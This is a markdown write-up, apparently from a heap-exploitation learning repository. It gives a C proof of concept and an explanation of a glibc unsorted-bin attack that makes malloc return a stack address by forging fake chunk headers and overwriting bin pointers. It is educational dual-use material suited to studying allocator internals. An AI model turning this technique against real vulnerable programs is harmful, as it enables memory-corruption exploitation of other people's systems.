<details>
<summary><strong>Description</strong></summary>
<p>

we will be trying to get malloc to allocate a ptr on the stack. This will be done via leveraging the unsorted bin linked list...
> i modified the shogun poc (easier?)

</p>
</details>

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled with glibc `2.31`, `2.35`, `2.38` and `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

void main() {
    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long *chunk0, *chunk1, stack_array[10], *chunk3;

    // allocate two unsortedbin range chunks
    chunk0 = malloc(0x420);
    malloc(0x18); // padding to prevent consolidation
    chunk1 = malloc(0x420);
    malloc(0x18); // padding to prevent consolidation

    free(chunk0); // insert them into the unsorted bin
    free(chunk1);

    // create the unsorted bin fake chunk header
    // stack_array[0] = 0x00; // fake chunk's prev_size (usually we dont need to care about this)
    stack_array[1] = 0x41; // fake chunk's size (turn on the prev_inuse for easier)

    // add a fake heap chunk header, right after the end of our fake unsorted bin chunk
    // this is because there are checks for the next adjacent chunk, since if malloc properly allocated this (fake) chunk, there would be one there
    stack_array[8] = 0x40; // fake adjacent chunk prev_size
    stack_array[9] = 0x50; // fake adjacent chunk size (turn off the prev_inuse)

    // set the fwd/bk pointers of our unsorted bin fake chunk, so that they point to the two chunks were linking to here
    stack_array[2] = ((long)chunk0 - 0x10); // fwd
    stack_array[3] = ((long)chunk1 - 0x10); // bk

    // now we will link in our fake chunk via overwriting the fwd/bk ptr of two other chunks in the unsorted bin
    // which we have already linked against with our fake unsorted bin chunk
    /*VULNERABILITY*/
    chunk0[1] = (long)(stack_array); // bk
    chunk1[0] = (long)(stack_array); // fwd
    /*VULNERABILITY*/

    // now fake chunk is in unsortedbin and ready to allocate (it will act like normal unsortedbin (behaviour))
    chunk3 = malloc(0x38);

    printf("chunk3: %p\n", chunk3);
}
```

</p>
</details>

<details>
<summary><strong>Explain</strong></summary>
<p>

we will effectively create a fake unsorted bin chunk, and overwrite the fwd ptr of one unsorted bin chunk, and the bk ptr of another unsorted bin chunk to effectively insert the fake unsorted bin chunk into the unsorted bin. For the fake unsorted bin chunk, we will set the fwd/bk ptrs to the two chunks we linked to the fake unsorted bin chunk, as it should

we will need to set some things for the fake unsorted bin chunk. We will need to set the `prev_size` (to `0x01`), and the size of the chunk header (I will be setting it to `0x41`). In addition to that, we will need to make a fake chunk header right after our fake chunk, as there should be one if this was an actual malloc chunk. The `prev_size` must match the size of our chunk, which will be `0x40`.  For the size, I just put 0x50 (not a lot of thought here, the `prev_inuse` isn't set, however this might cause some problems under the right condition)...

in summary, for the size of the fake unsorted bin chunk, there are three main considerations for it. **The first**, is that the amount of data we will be able to write to the chunk will be directly tied to the size of it. **The second** is that we will need a fake chunk header right after our fake unsorted bin chunk, whose location will be determined by the start of our fake unsorted bin chunk, and its size. **The third** consideration, is if the chunk gets moved over into either a small / large bin, its size will determine which bin it gets moved over into.

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/guyinatuxedo/Shogun/blob/main/pwn_demos/unsorted_bin/unsorted_linked/readme.md
> i modified this a little bit (easier)

</p>
</details>